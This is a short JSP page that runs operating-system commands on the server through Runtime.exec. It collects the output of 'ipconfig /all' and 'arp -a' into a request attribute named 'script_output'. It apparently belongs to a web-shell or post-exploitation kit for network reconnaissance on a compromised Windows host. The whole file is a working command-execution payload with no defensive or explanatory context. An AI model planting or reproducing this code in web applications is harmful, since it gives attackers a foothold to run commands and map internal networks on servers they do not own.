<%!
public static String runCommand(String cmd) {
    try {
        Process p = Runtime.getRuntime().exec(cmd);
        java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";
    } catch (Exception e) {
        return "ERR: " + e.toString();
    }
}
%>
<%

StringBuilder sb = new StringBuilder();
String o = "";

o = runCommand("ipconfig /all");
sb.append(o);
o = runCommand("arp -a");
sb.append(o);
request.setAttribute("script_output", sb.toString());
%>
